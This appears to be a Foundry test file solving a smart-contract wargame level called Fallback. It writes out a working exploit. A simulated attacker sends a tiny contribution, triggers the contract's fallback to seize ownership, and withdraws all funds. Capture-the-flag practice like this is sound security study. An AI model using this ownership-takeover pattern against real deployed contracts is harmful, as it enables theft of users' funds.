// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/01_Fallback.sol";

contract FallbackTest is Test {
    Fallback public fb;
    
    address public hacker = address(0x1337); 
    
    function setUp() public {
        fb = new Fallback();
        vm.deal(hacker, 1 ether); 
    }

    function testExploit() public {
        vm.startPrank(hacker);

        console.log("Owner inicial:", fb.owner());
        console.log("Balance inicial del hacker:", hacker.balance);

        fb.contribute{value: 1 wei}();

        (bool success, ) = address(fb).call{value: 1 wei}("");
        require(success, "Fallo el secuestro del contrato");

        assertEq(fb.owner(), hacker);
        console.log("Owner despues del hack:", fb.owner());

        fb.withdraw();

        assertEq(address(fb).balance, 0);
        
        vm.stopPrank();
    }
}